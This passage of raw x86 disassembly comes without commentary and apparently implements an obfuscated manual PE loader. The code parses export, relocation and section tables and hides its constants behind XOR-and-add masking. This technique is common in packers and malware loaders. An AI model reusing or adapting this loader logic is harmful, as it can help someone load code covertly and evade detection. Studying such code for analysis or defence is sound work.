  426d87:	ret    
  426d88:	push   ebp
  426d89:	mov    ebp,esp
  426d8b:	mov    ecx,DWORD PTR [ecx+0x190]
  426d91:	mov    eax,DWORD PTR [ebp+0xc]
  426d94:	sub    esp,0x10
  426d97:	push   ebx
  426d98:	xor    ebx,ebx
  426d9a:	push   esi
  426d9b:	push   edi
  426d9c:	cmp    DWORD PTR [ecx],ebx
  426d9e:	je     0x426e26
  426da4:	cmp    eax,ebx
  426da6:	je     0x426e26
  426da8:	cmp    DWORD PTR [eax+0x78],ebx
  426dab:	jne    0x426db2
  426dad:	xor    eax,eax
  426daf:	inc    eax
  426db0:	jmp    0x426e28
  426db2:	mov    eax,DWORD PTR [eax+0x78]
  426db5:	add    eax,DWORD PTR [ebp+0x8]
  426db8:	mov    ecx,DWORD PTR [eax+0x1c]
  426dbb:	mov    edx,DWORD PTR [eax+0x24]
  426dbe:	mov    esi,DWORD PTR [eax+0x14]
  426dc1:	mov    edi,DWORD PTR [eax+0x18]
  426dc4:	add    ecx,DWORD PTR [ebp+0x8]
  426dc7:	add    edx,DWORD PTR [ebp+0x8]
  426dca:	mov    DWORD PTR [ebp-0x4],esi
  426dcd:	cmp    esi,edi
  426dcf:	ja     0x426dd4
  426dd1:	mov    DWORD PTR [ebp-0x4],edi
  426dd4:	mov    DWORD PTR [ebp-0x8],ebx
  426dd7:	cmp    DWORD PTR [ebp-0x4],ebx
  426dda:	jbe    0x426dad
  426ddc:	cmp    ebx,DWORD PTR [eax+0x14]
  426ddf:	jae    0x426de7
  426de1:	movzx  esi,WORD PTR [edx+ebx*2]
  426de5:	jmp    0x426de9
  426de7:	mov    esi,ebx
  426de9:	lea    esi,[ecx+esi*4]
  426dec:	mov    edi,DWORD PTR [esi]
  426dee:	test   edi,edi
  426df0:	je     0x426e1b
  426df2:	add    edi,DWORD PTR [ebp+0x8]
  426df5:	mov    DWORD PTR [ebp-0x10],edi
  426df8:	cmp    edi,eax
  426dfa:	jbe    0x426e0c
  426dfc:	mov    ebx,DWORD PTR [ebp+0xc]
  426dff:	mov    ebx,DWORD PTR [ebx+0x7c]
  426e02:	add    ebx,eax
  426e04:	cmp    edi,ebx
  426e06:	jae    0x426e0c
  426e08:	mov    esi,DWORD PTR [esi]
  426e0a:	jmp    0x426e14
  426e0c:	sub    edi,DWORD PTR [ebp+0x8]
  426e0f:	mov    DWORD PTR [esi],edi
  426e11:	mov    esi,DWORD PTR [ebp-0x10]
  426e14:	test   esi,esi
  426e16:	je     0x426e26
  426e18:	mov    ebx,DWORD PTR [ebp-0x8]
  426e1b:	inc    ebx
  426e1c:	mov    DWORD PTR [ebp-0x8],ebx
  426e1f:	cmp    ebx,DWORD PTR [ebp-0x4]
  426e22:	jb     0x426ddc
  426e24:	jmp    0x426dad
  426e26:	xor    eax,eax
  426e28:	pop    edi
  426e29:	pop    esi
  426e2a:	pop    ebx
  426e2b:	leave  
  426e2c:	ret    0x8
  426e2f:	push   ebp
  426e30:	mov    ebp,esp
  426e32:	sub    esp,0x2c
  426e35:	mov    edx,0xf89c85a5
  426e3a:	mov    DWORD PTR [ebp-0x4],edx
  426e3d:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  426e44:	mov    eax,DWORD PTR [ebp-0x4]
  426e47:	mov    ecx,DWORD PTR [ebp-0x4]
  426e4a:	mov    ecx,DWORD PTR [ebp-0x4]
  426e4d:	mov    ecx,DWORD PTR [ebp-0x4]
  426e50:	mov    ecx,DWORD PTR [ebp-0x4]
  426e53:	mov    ecx,DWORD PTR [ebp-0x4]
  426e56:	push   ebx
  426e57:	mov    ebx,DWORD PTR [ebp+0x10]
  426e5a:	push   esi
  426e5b:	mov    esi,0x75108aa
  426e60:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  426e67:	mov    ecx,DWORD PTR [ebp-0x4]
  426e6a:	mov    ebx,DWORD PTR [ebx+0x190]
  426e70:	push   edi
  426e71:	mov    edi,0x3272f1
  426e76:	xor    ecx,esi
  426e78:	xor    eax,esi
  426e7a:	add    eax,edi
  426e7c:	add    ecx,edi
  426e7e:	mov    DWORD PTR [ebp-0x18],eax
  426e81:	cmp    ecx,DWORD PTR [ebx]
  426e83:	je     0x427104
  426e89:	mov    ebx,DWORD PTR [ebp-0x4]
  426e8c:	mov    ecx,DWORD PTR [ebp+0xc]
  426e8f:	xor    ebx,esi
  426e91:	add    ebx,edi
  426e93:	cmp    ebx,ecx
  426e95:	je     0x427104
  426e9b:	mov    ebx,DWORD PTR [ebp-0x4]
  426e9e:	mov    ecx,DWORD PTR [ecx+0x80]
  426ea4:	xor    ebx,esi
  426ea6:	add    ebx,edi
  426ea8:	cmp    ecx,ebx
  426eaa:	je     0x4270ff
  426eb0:	add    ecx,DWORD PTR [ebp+0x8]
  426eb3:	mov    DWORD PTR [ebp-0x2c],ecx
  426eb6:	mov    ebx,edx
  426eb8:	xor    ebx,esi
  426eba:	add    ebx,edi
  426ebc:	mov    DWORD PTR [ebp-0x10],ebx
  426ebf:	mov    ebx,DWORD PTR [ebp-0x10]
  426ec2:	cmp    ebx,edx
  426ec4:	je     0x426ed8
  426ec6:	mov    edx,DWORD PTR [ebp-0x10]
  426ec9:	mov    ebx,DWORD PTR [ebp-0x4]
  426ecc:	imul   edx,edx,0x14
  426ecf:	xor    ebx,esi
  426ed1:	add    ebx,edi
  426ed3:	cmp    DWORD PTR [edx+ecx*1],ebx
  426ed6:	jne    0x426eef
  426ed8:	mov    edx,DWORD PTR [ebp-0x10]
  426edb:	mov    ebx,DWORD PTR [ebp-0x4]
  426ede:	imul   edx,edx,0x14
  426ee1:	xor    ebx,esi
  426ee3:	add    ebx,edi
  426ee5:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  426ee9:	je     0x4270f1
  426eef:	mov    eax,DWORD PTR [ebp-0x4]
  426ef2:	mov    ebx,DWORD PTR [ebp-0x4]
  426ef5:	mov    eax,DWORD PTR [ebp-0x10]
  426ef8:	imul   eax,eax,0x14
  426efb:	add    eax,ecx
  426efd:	mov    ecx,DWORD PTR [eax+0x10]
  426f00:	add    ecx,DWORD PTR [ebp+0x8]
  426f03:	xor    ebx,esi
  426f05:	mov    DWORD PTR [ebp-0x1c],ecx
  426f08:	mov    ecx,DWORD PTR [ebp-0x4]
  426f0b:	mov    edx,DWORD PTR [ebp-0x4]
  426f0e:	xor    ecx,esi
  426f10:	add    ecx,edi
  426f12:	xor    edx,esi
  426f14:	mov    DWORD PTR [ebp-0x24],ecx
  426f17:	mov    ecx,DWORD PTR [eax]
  426f19:	add    edx,edi
  426f1b:	add    ebx,edi
  426f1d:	cmp    ecx,edx
  426f1f:	je     0x426f27
  426f21:	add    ecx,DWORD PTR [ebp+0x8]
  426f24:	mov    DWORD PTR [ebp-0x24],ecx
  426f27:	mov    ecx,DWORD PTR [ebp-0x4]
  426f2a:	xor    ecx,esi
  426f2c:	add    ecx,DWORD PTR [eax+0xc]
  426f2f:	mov    eax,DWORD PTR [ebp+0x8]
  426f32:	lea    eax,[ecx+eax*1+0x3272f1]
  426f39:	mov    DWORD PTR [ebp+0xc],eax
  426f3c:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  426f43:	mov    eax,DWORD PTR [ebp+0x10]
  426f46:	push   DWORD PTR [ebp+0xc]
  426f49:	mov    eax,DWORD PTR [eax+0x1e0]
  426f4f:	call   DWORD PTR [eax]
  426f51:	mov    ecx,DWORD PTR [ebp-0x4]
  426f54:	xor    ecx,esi
  426f56:	add    ecx,edi
  426f58:	mov    DWORD PTR [ebp-0xc],eax
  426f5b:	cmp    ecx,eax
  426f5d:	jne    0x426f71
  426f5f:	mov    eax,DWORD PTR [ebp+0x10]
  426f62:	push   DWORD PTR [ebp+0xc]
  426f65:	mov    eax,DWORD PTR [eax+0x1e0]
  426f6b:	call   DWORD PTR [eax+0xc]
  426f6e:	mov    DWORD PTR [ebp-0xc],eax
  426f71:	mov    DWORD PTR [ebp-0x20],0x7f661b22
  426f78:	mov    DWORD PTR [ebp-0x20],0xf89c9852
  426f7f:	mov    eax,DWORD PTR [ebp-0x4]
  426f82:	xor    eax,esi
  426f84:	add    eax,edi
  426f86:	cmp    eax,DWORD PTR [ebp-0xc]
  426f89:	jne    0x426fae
  426f8b:	mov    eax,DWORD PTR [ebp-0x8]
  426f8e:	mov    ecx,DWORD PTR [ebp-0x20]
  426f91:	xor    eax,esi
  426f93:	xor    ecx,esi
  426f95:	lea    ebx,[ebx+eax*1+0x3272f1]
  426f9c:	mov    eax,DWORD PTR [ebp+0x10]
  426f9f:	mov    eax,DWORD PTR [eax+0x1e0]
  426fa5:	add    ecx,edi
  426fa7:	imul   ecx,ebx
  426faa:	push   ecx
  426fab:	call   DWORD PTR [eax+0x24]
  426fae:	mov    eax,DWORD PTR [ebp-0x4]
  426fb1:	xor    eax,esi
  426fb3:	add    eax,edi
  426fb5:	cmp    eax,DWORD PTR [ebp-0xc]
  426fb8:	jne    0x426fc9
  426fba:	mov    eax,DWORD PTR [ebp-0x28]
  426fbd:	xor    eax,esi
  426fbf:	add    eax,edi
  426fc1:	cmp    ebx,eax
  426fc3:	jbe    0x426f43
  426fc9:	mov    eax,DWORD PTR [ebp-0x4]
  426fcc:	xor    eax,esi
  426fce:	add    eax,edi
  426fd0:	cmp    eax,DWORD PTR [ebp-0xc]
  426fd3:	jne    0x426fec
  426fd5:	mov    eax,DWORD PTR [ebp-0x8]
  426fd8:	mov    ecx,DWORD PTR [ebp-0x18]
  426fdb:	xor    eax,esi
  426fdd:	lea    eax,[ecx+eax*1+0x3272f1]
  426fe4:	mov    DWORD PTR [ebp-0x18],eax
  426fe7:	jmp    0x4270db
  426fec:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  426ff3:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  426ffa:	mov    ebx,DWORD PTR [ebp-0x4]
  426ffd:	xor    ebx,esi
  426fff:	add    ebx,edi
  427001:	jmp    0x4270c8
  427006:	mov    eax,DWORD PTR [ebp-0x4]
  427009:	xor    eax,esi
  42700b:	add    eax,edi
  42700d:	mov    DWORD PTR [ebp-0x14],eax
  427010:	mov    eax,DWORD PTR [ebp-0x4]
  427013:	xor    eax,esi
  427015:	add    eax,edi
  427017:	mov    DWORD PTR [ebp+0xc],eax
  42701a:	mov    ecx,DWORD PTR [ebp-0x4]
  42701d:	mov    eax,DWORD PTR [ebp-0x24]
  427020:	xor    ecx,esi
  427022:	add    ecx,edi
  427024:	cmp    ecx,eax
  427026:	je     0x42702e
  427028:	mov    eax,DWORD PTR [eax+ebx*4]
  42702b:	mov    DWORD PTR [ebp-0x14],eax
  42702e:	mov    eax,DWORD PTR [ebp-0x1c]
  427031:	mov    eax,DWORD PTR [eax+ebx*4]
  427034:	mov    DWORD PTR [ebp+0xc],eax
  427037:	mov    eax,DWORD PTR [ebp-0x4]
  42703a:	mov    ecx,DWORD PTR [ebp-0x14]
  42703d:	xor    eax,esi
  42703f:	add    eax,edi
  427041:	cmp    eax,ecx
  427043:	je     0x42706e
  427045:	mov    eax,DWORD PTR [ebp-0x4]
  427048:	mov    ecx,DWORD PTR [ebp-0x14]
  42704b:	xor    eax,esi
  42704d:	add    eax,edi
  42704f:	shr    ecx,0x1f
  427052:	cmp    eax,ecx
  427054:	je     0x42706e
  427056:	mov    ecx,DWORD PTR [ebp-0x14]
  427059:	mov    eax,DWORD PTR [ebp+0x10]
  42705c:	mov    eax,DWORD PTR [eax+0x1e0]
  427062:	movzx  ecx,cx
  427065:	push   ecx
  427066:	push   DWORD PTR [ebp-0xc]
  427069:	call   DWORD PTR [eax+0x8]
  42706c:	jmp    0x427087
  42706e:	mov    eax,DWORD PTR [ebp+0xc]
  427071:	add    eax,DWORD PTR [ebp+0x8]
  427074:	mov    ecx,DWORD PTR [ebp+0x10]
  427077:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42707d:	add    eax,0x2
  427080:	push   eax
  427081:	push   DWORD PTR [ebp-0xc]
  427084:	call   DWORD PTR [ecx+0x8]
  427087:	mov    DWORD PTR [ebp+0xc],eax
  42708a:	mov    eax,DWORD PTR [ebp-0x4]
  42708d:	mov    ecx,DWORD PTR [ebp+0xc]
  427090:	xor    eax,esi
  427092:	add    eax,edi
  427094:	cmp    eax,ecx
  427096:	mov    eax,DWORD PTR [ebp-0x8]
  427099:	jne    0x4270ac
  42709b:	mov    ecx,DWORD PTR [ebp-0x18]
  42709e:	xor    eax,esi
  4270a0:	lea    eax,[ecx+eax*1+0x3272f1]
  4270a7:	mov    DWORD PTR [ebp-0x18],eax
  4270aa:	jmp    0x4270bc
  4270ac:	mov    ecx,DWORD PTR [ebp+0xc]
  4270af:	xor    eax,esi
  4270b1:	add    eax,edi
  4270b3:	imul   eax,ecx
  4270b6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270b9:	mov    DWORD PTR [ecx+ebx*4],eax
  4270bc:	mov    eax,DWORD PTR [ebp-0x8]
  4270bf:	xor    eax,esi
  4270c1:	lea    ebx,[ebx+eax*1+0x3272f1]
  4270c8:	mov    eax,DWORD PTR [ebp-0x4]
  4270cb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270ce:	xor    eax,esi
  4270d0:	add    eax,edi
  4270d2:	cmp    DWORD PTR [ecx+ebx*4],eax
  4270d5:	jne    0x427006
  4270db:	mov    edx,DWORD PTR [ebp-0x10]
  4270de:	mov    ecx,DWORD PTR [ebp-0x2c]
  4270e1:	mov    eax,DWORD PTR [ebp-0x18]
  4270e4:	sub    edx,0x3272f0
  4270ea:	xor    edx,esi
  4270ec:	jmp    0x426eb6
  4270f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4270f4:	xor    ecx,esi
  4270f6:	add    ecx,edi
  4270f8:	cmp    eax,ecx
  4270fa:	mov    eax,DWORD PTR [ebp-0x4]
  4270fd:	jne    0x427107
  4270ff:	mov    eax,DWORD PTR [ebp-0x8]
  427102:	jmp    0x427107
  427104:	mov    eax,DWORD PTR [ebp-0x4]
  427107:	xor    eax,esi
  427109:	add    eax,edi
  42710b:	pop    edi
  42710c:	pop    esi
  42710d:	pop    ebx
  42710e:	leave  
  42710f:	ret    0xc
  427112:	push   ebp
  427113:	mov    ebp,esp
  427115:	sub    esp,0x28
  427118:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42711f:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  427126:	mov    eax,DWORD PTR [ebp+0xc]
  427129:	mov    DWORD PTR [ebp+0xc],eax
  42712c:	push   esi
  42712d:	mov    eax,eax
  42712f:	mov    eax,DWORD PTR [ebp-0x4]
  427132:	mov    esi,DWORD PTR [ebp+0x8]
  427135:	mov    ecx,0x75108aa
  42713a:	xor    eax,ecx
  42713c:	mov    edx,0x3272f1
  427141:	add    eax,edx
  427143:	cmp    esi,eax
  427145:	je     0x42726c
  42714b:	mov    eax,DWORD PTR [ebp+0x8]
  42714e:	mov    esi,DWORD PTR [ebp+0x8]
  427151:	add    esi,DWORD PTR [eax+0x3c]
  427154:	push   edi
  427155:	mov    DWORD PTR [ebp+0xc],esi
  427158:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  42715f:	mov    eax,DWORD PTR [ebp-0x1c]
  427162:	mov    esi,DWORD PTR [ebp-0x4]
  427165:	mov    edi,DWORD PTR [ebp+0xc]
  427168:	xor    esi,ecx
  42716a:	xor    eax,ecx
  42716c:	add    esi,edx
  42716e:	cmp    DWORD PTR [edi+eax*8+0x1939800],esi
  427175:	je     0x427266
  42717b:	mov    esi,DWORD PTR [ebp+0xc]
  42717e:	mov    eax,DWORD PTR [ebp+0x8]
  427181:	add    eax,DWORD PTR [esi+0xa0]
  427187:	mov    esi,DWORD PTR [ebp+0x8]
  42718a:	mov    edi,DWORD PTR [ebp+0xc]
  42718d:	sub    esi,DWORD PTR [edi+0x34]
  427190:	mov    edi,DWORD PTR [ebp-0x4]
  427193:	xor    edi,ecx
  427195:	add    edi,edx
  427197:	mov    DWORD PTR [ebp-0x24],esi
  42719a:	cmp    esi,edi
  42719c:	je     0x427266
  4271a2:	mov    esi,DWORD PTR [ebp-0x4]
  4271a5:	xor    esi,ecx
  4271a7:	add    esi,edx
  4271a9:	mov    DWORD PTR [ebp-0x8],esi
  4271ac:	push   ebx
  4271ad:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  4271b4:	jmp    0x427250
  4271b9:	mov    esi,DWORD PTR [ebp-0x4]
  4271bc:	xor    esi,ecx
  4271be:	lea    edi,[ebx-0x8]
  4271c1:	add    esi,edx
  4271c3:	shr    edi,1
  4271c5:	cmp    esi,edi
  4271c7:	jae    0x427236
  4271c9:	sub    edi,esi
  4271cb:	lea    ebx,[eax+esi*2+0x8]
  4271cf:	mov    DWORD PTR [ebp-0x18],edi
  4271d2:	movzx  esi,WORD PTR [ebx]
  4271d5:	and    esi,0xfff
  4271db:	mov    DWORD PTR [ebp-0x14],esi
  4271de:	mov    edi,DWORD PTR [ebp-0x14]
  4271e1:	mov    esi,DWORD PTR [eax]
  4271e3:	sub    esi,edx
  4271e5:	add    edi,esi
  4271e7:	movzx  esi,WORD PTR [ebx]
  4271ea:	shr    esi,0xc
  4271ed:	xor    edi,ecx
  4271ef:	mov    DWORD PTR [ebp-0x20],edi
  4271f2:	mov    DWORD PTR [ebp-0x14],esi
  4271f5:	mov    esi,DWORD PTR [ebp-0x20]
  4271f8:	mov    edi,DWORD PTR [ebp+0x8]
  4271fb:	xor    esi,ecx
  4271fd:	lea    esi,[esi+edi*1+0x3272f1]
  427204:	mov    DWORD PTR [ebp-0x20],esi
  427207:	mov    esi,DWORD PTR [ebp-0x10]
  42720a:	mov    edi,DWORD PTR [ebp-0x14]
  42720d:	xor    esi,ecx
  42720f:	add    esi,edx
  427211:	cmp    edi,esi
  427213:	jne    0x42722b
  427215:	mov    esi,DWORD PTR [ebp-0x10]
  427218:	mov    edi,DWORD PTR [ebp-0x14]
  42721b:	xor    esi,ecx
  42721d:	add    esi,edx
  42721f:	cmp    edi,esi
  427221:	jne    0x42722b
  427223:	mov    esi,DWORD PTR [ebp-0x20]
  427226:	mov    edi,DWORD PTR [ebp-0x24]
  427229:	add    DWORD PTR [esi],edi
  42722b:	add    ebx,0x2
  42722e:	dec    DWORD PTR [ebp-0x18]
  427231:	jne    0x4271d2
  427233:	mov    ebx,DWORD PTR [ebp-0xc]
  427236:	add    DWORD PTR [ebp-0x8],ebx
  427239:	mov    esi,DWORD PTR [ebp-0x1c]
  42723c:	mov    edi,DWORD PTR [ebp-0x8]
  42723f:	mov    ebx,DWORD PTR [ebp+0xc]
  427242:	xor    esi,ecx
  427244:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939804]
  42724b:	jae    0x427265
  42724d:	add    eax,DWORD PTR [ebp-0xc]
  427250:	mov    esi,DWORD PTR [ebp-0x4]
  427253:	mov    ebx,DWORD PTR [eax+0x4]
  427256:	xor    esi,ecx
  427258:	add    esi,edx
  42725a:	mov    DWORD PTR [ebp-0xc],ebx
  42725d:	cmp    ebx,esi
  42725f:	jne    0x4271b9
  427265:	pop    ebx
  427266:	mov    eax,DWORD PTR [ebp-0x28]
  427269:	pop    edi
  42726a:	jmp    0x42726f
  42726c:	mov    eax,DWORD PTR [ebp-0x4]
  42726f:	xor    eax,ecx
  427271:	add    eax,edx
  427273:	pop    esi
  427274:	leave  
  427275:	ret    0x8
  427278:	push   ebp
  427279:	mov    ebp,esp
  42727b:	sub    esp,0xd8
  427281:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427288:	mov    DWORD PTR [ebp-0x24],0xf89c85ba
  42728f:	mov    eax,DWORD PTR [ebp-0x4]
  427292:	push   ebx
  427293:	push   esi
  427294:	mov    esi,0x75108aa
  427299:	xor    eax,esi
  42729b:	push   edi
  42729c:	mov    edi,0x3272f1
  4272a1:	add    eax,edi
  4272a3:	mov    DWORD PTR [ebp-0x18],eax
  4272a6:	mov    eax,DWORD PTR [ebp-0x4]
  4272a9:	xor    eax,esi
  4272ab:	add    eax,edi
  4272ad:	mov    DWORD PTR [ebp-0x8],eax
  4272b0:	mov    ebx,DWORD PTR [ebp+0x20]
  4272b3:	mov    eax,DWORD PTR [ebp-0x1c]
  4272b6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4272b9:	xor    eax,ecx
  4272bb:	mov    DWORD PTR [ebp-0x1c],eax
  4272be:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  4272c5:	mov    eax,DWORD PTR [ebp-0xc]
  4272c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4272cb:	xor    eax,ecx
  4272cd:	mov    DWORD PTR [ebp-0xc],eax
  4272d0:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  4272d7:	mov    eax,DWORD PTR [ebp-0x10]
  4272da:	mov    ecx,DWORD PTR [ebp-0x10]
  4272dd:	xor    eax,ecx
  4272df:	mov    DWORD PTR [ebp-0x10],eax
  4272e2:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4272e9:	mov    eax,DWORD PTR [ebp-0x28]
  4272ec:	mov    ecx,DWORD PTR [ebp-0x28]
  4272ef:	xor    eax,ecx
  4272f1:	mov    DWORD PTR [ebp-0x28],eax
  4272f4:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4272fb:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  427302:	mov    eax,DWORD PTR [ebp+0x8]
  427305:	test   eax,eax
  427307:	je     0x427790
  42730d:	mov    eax,DWORD PTR [ebp+0xc]
  427310:	test   eax,eax
  427312:	je     0x427790
  427318:	mov    eax,DWORD PTR [ebp+0x18]
  42731b:	test   eax,eax
  42731d:	je     0x427790
  427323:	mov    eax,DWORD PTR [ebp+0x20]
  427326:	mov    ecx,DWORD PTR [ebp+0x8]
  427329:	xor    eax,0x8aa
  42732e:	add    eax,0x72f1
  427333:	cmp    WORD PTR [ecx],ax
  427336:	jne    0x427790
  42733c:	mov    eax,DWORD PTR [ebp-0x4]
  42733f:	xor    eax,esi
  427341:	add    eax,edi
  427343:	mov    DWORD PTR [ebp-0x30],eax
  427346:	mov    eax,DWORD PTR [ebp-0x4]
  427349:	mov    ecx,DWORD PTR [ebp+0x8]
  42734c:	mov    eax,DWORD PTR [ebp+0x8]
  42734f:	add    eax,DWORD PTR [ecx+0x3c]
  427352:	mov    DWORD PTR [ebp+0xc],eax
  427355:	mov    eax,DWORD PTR [eax+0x50]
  427358:	test   eax,eax
  42735a:	je     0x427790
  427360:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  427367:	mov    eax,DWORD PTR [ebp-0x2c]
  42736a:	xor    eax,esi
  42736c:	add    eax,edi
  42736e:	mov    DWORD PTR [ebp-0x2c],eax
  427371:	mov    eax,DWORD PTR [ebp-0x4]
  427374:	mov    eax,DWORD PTR [ebx+0x190]
  42737a:	mov    ecx,DWORD PTR [eax]
  42737c:	mov    ecx,DWORD PTR [ecx+0x3c]
  42737f:	add    ecx,DWORD PTR [eax]
  427381:	mov    eax,DWORD PTR [ebp-0x4]
  427384:	mov    eax,DWORD PTR [ebx+0x18c]
  42738a:	mov    edx,DWORD PTR [eax]
  42738c:	mov    DWORD PTR [ebp-0x20],ecx
  42738f:	mov    DWORD PTR [ebp+0x20],edx
  427392:	cmp    edx,edx
  427394:	jne    0x4273c8
  427396:	mov    eax,DWORD PTR [ebx+0x1e0]
  42739c:	lea    edx,[ebp-0x18]
  42739f:	push   edx
  4273a0:	mov    edx,DWORD PTR [ebp-0xc]
  4273a3:	xor    edx,esi
  4273a5:	add    edx,edi
  4273a7:	push   edx
  4273a8:	push   DWORD PTR [ecx+0x50]
  4273ab:	push   DWORD PTR [ebp+0x20]
  4273ae:	call   DWORD PTR [eax+0x1c]
  4273b1:	mov    eax,DWORD PTR [ebp-0x20]
  4273b4:	mov    ecx,DWORD PTR [eax+0x54]
  4273b7:	mov    eax,DWORD PTR [eax+0x50]
  4273ba:	sub    eax,ecx
  4273bc:	add    ecx,DWORD PTR [ebp+0x20]
  4273bf:	push   ecx
  4273c0:	call   0x427d2b
  4273c5:	mov    edx,DWORD PTR [ebp+0x20]
  4273c8:	mov    eax,DWORD PTR [ebx+0x194]
  4273ce:	mov    DWORD PTR [eax],edx
  4273d0:	mov    eax,DWORD PTR [ebp+0xc]
  4273d3:	push   DWORD PTR [eax+0x54]
  4273d6:	push   DWORD PTR [ebp+0x8]
  4273d9:	push   edx
  4273da:	call   0x427c21
  4273df:	mov    ecx,DWORD PTR [ebp+0x20]
  4273e2:	mov    eax,DWORD PTR [ecx+0x3c]
  4273e5:	add    eax,ecx
  4273e7:	movzx  ecx,WORD PTR [eax+0x14]
  4273eb:	lea    ecx,[ecx+eax*1+0x18]
  4273ef:	mov    DWORD PTR [ebp+0x18],ecx
  4273f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4273f5:	movzx  edx,WORD PTR [eax+0x6]
  4273f9:	xor    ecx,esi
  4273fb:	add    ecx,edi
  4273fd:	mov    DWORD PTR [ebp+0xc],eax
  427400:	cmp    edx,ecx
  427402:	je     0x4274af
  427408:	mov    ecx,DWORD PTR [ebp-0x4]
  42740b:	xor    ecx,esi
  42740d:	add    ecx,edi
  42740f:	mov    DWORD PTR [ebp-0x8],ecx
  427412:	mov    ecx,DWORD PTR [ebp-0x24]
  427415:	movzx  edx,WORD PTR [eax+0x6]
  427419:	xor    ecx,esi
  42741b:	sub    edx,ecx
  42741d:	sub    edx,edi
  42741f:	cmp    DWORD PTR [ebp-0x8],edx
  427422:	ja     0x4274af
  427428:	mov    edx,DWORD PTR [ebp+0x18]
  42742b:	add    edx,0x8
  42742e:	mov    DWORD PTR [ebp+0x18],edx
  427431:	jmp    0x427436
  427433:	mov    edx,DWORD PTR [ebp+0x18]
  427436:	mov    eax,DWORD PTR [eax+0x38]
  427439:	lea    ecx,[eax-0x1]
  42743c:	mov    DWORD PTR [ebp-0x38],eax
  42743f:	mov    eax,DWORD PTR [edx]
  427441:	test   eax,ecx
  427443:	je     0x42744c
  427445:	not    ecx
  427447:	and    eax,ecx
  427449:	add    eax,DWORD PTR [ebp-0x38]
  42744c:	mov    ecx,DWORD PTR [edx+0x4]
  42744f:	add    ecx,DWORD PTR [ebp+0x20]
  427452:	push   ecx
  427453:	call   0x427d2b
  427458:	mov    edx,DWORD PTR [ebp-0x4]
  42745b:	mov    eax,DWORD PTR [ebp+0x18]
  42745e:	mov    ecx,DWORD PTR [eax+0x8]
  427461:	xor    edx,esi
  427463:	add    edx,edi
  427465:	cmp    ecx,edx
  427467:	je     0x427480
  427469:	push   ecx
  42746a:	mov    ecx,DWORD PTR [ebp+0x8]
  42746d:	add    ecx,DWORD PTR [eax+0xc]
  427470:	mov    eax,DWORD PTR [eax+0x4]
  427473:	add    eax,DWORD PTR [ebp+0x20]
  427476:	push   ecx
  427477:	push   eax
  427478:	call   0x427c21
  42747d:	mov    eax,DWORD PTR [ebp+0x18]
  427480:	mov    ecx,DWORD PTR [ebp-0x24]
  427483:	mov    edx,DWORD PTR [ebp-0x8]
  427486:	add    eax,0x28
  427489:	xor    ecx,esi
  42748b:	lea    ecx,[edx+ecx*1+0x3272f1]
  427492:	mov    edx,DWORD PTR [ebp+0xc]
  427495:	mov    DWORD PTR [ebp+0x18],eax
  427498:	mov    eax,DWORD PTR [ebp-0x24]
  42749b:	movzx  edx,WORD PTR [edx+0x6]
  42749f:	xor    eax,esi
  4274a1:	sub    edx,eax
  4274a3:	mov    eax,DWORD PTR [ebp+0xc]
  4274a6:	sub    edx,edi
  4274a8:	mov    DWORD PTR [ebp-0x8],ecx
  4274ab:	cmp    ecx,edx
  4274ad:	jbe    0x427433
  4274af:	mov    edx,DWORD PTR [ebx+0x18c]
  4274b5:	mov    ecx,DWORD PTR [ebp+0x20]
  4274b8:	cmp    ecx,DWORD PTR [edx]
  4274ba:	jne    0x4274e3
  4274bc:	mov    eax,DWORD PTR [ebx+0x1e0]
  4274c2:	lea    edx,[ebp-0x18]
  4274c5:	push   edx
  4274c6:	mov    edx,DWORD PTR [ebp-0x10]
  4274c9:	xor    edx,esi
  4274cb:	add    edx,edi
  4274cd:	push   edx
  4274ce:	mov    edx,DWORD PTR [ebp-0x20]
  4274d1:	push   DWORD PTR [edx+0x54]
  4274d4:	push   ecx
  4274d5:	call   DWORD PTR [eax+0x1c]
  4274d8:	test   eax,eax
  4274da:	je     0x427781
  4274e0:	mov    eax,DWORD PTR [ebp+0xc]
  4274e3:	mov    ecx,DWORD PTR [ebx+0x1c8]
  4274e9:	mov    ecx,DWORD PTR [ecx]
  4274eb:	xor    ecx,esi
  4274ed:	add    ecx,edi
  4274ef:	je     0x4276ac
  4274f5:	mov    eax,DWORD PTR [ebp-0x4]
  4274f8:	xor    eax,esi
  4274fa:	add    eax,edi
  4274fc:	and    DWORD PTR [ebp+0x8],0x0
  427500:	mov    DWORD PTR [ebp-0x14],eax
  427503:	mov    eax,0xf89c85d9
  427508:	lea    ecx,[eax-0x8]
  42750b:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  427512:	mov    DWORD PTR [ebp-0x54],0xf89c8529
  427519:	mov    DWORD PTR [ebp-0x50],eax
  42751c:	mov    DWORD PTR [ebp-0x4c],ecx
  42751f:	mov    DWORD PTR [ebp-0x48],ecx
  427522:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  427529:	mov    edx,DWORD PTR [ebp+0x8]
  42752c:	mov    ecx,0x8aa
  427531:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  427536:	mov    edx,0x72f1
  42753b:	add    cx,dx
  42753e:	mov    edx,DWORD PTR [ebp+0x8]
  427541:	inc    DWORD PTR [ebp+0x8]
  427544:	cmp    DWORD PTR [ebp+0x8],0x6
